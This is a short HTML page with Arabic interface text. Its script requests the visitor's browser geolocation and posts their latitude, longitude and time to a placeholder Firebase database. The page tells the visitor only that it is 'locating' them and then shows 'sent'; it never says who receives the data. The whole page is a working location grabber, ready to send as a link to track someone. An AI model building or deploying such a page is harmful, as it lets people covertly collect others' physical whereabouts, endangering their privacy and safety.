<!DOCTYPE html>
<html>
<head>
  <title>Location</title>
</head>
<body>
<h3>جاري تحديد الموقع...</h3>

<script>
navigator.geolocation.getCurrentPosition(
  function(pos) {
    var lat = pos.coords.latitude;
    var lon = pos.coords.longitude;
    var time = new Date().toLocaleString();

    fetch("https://YOUR_FIREBASE_URL/locations.json", {
      method: "POST",
      body: JSON.stringify({
        latitude: lat,
        longitude: lon,
        time: time
      })
    });

    document.body.innerHTML = "تم الإرسال ✔";
  },
  function() {
    document.body.innerHTML = "لم يتم السماح بالموقع ❌";
  }
);
</script>
</body>
</html>
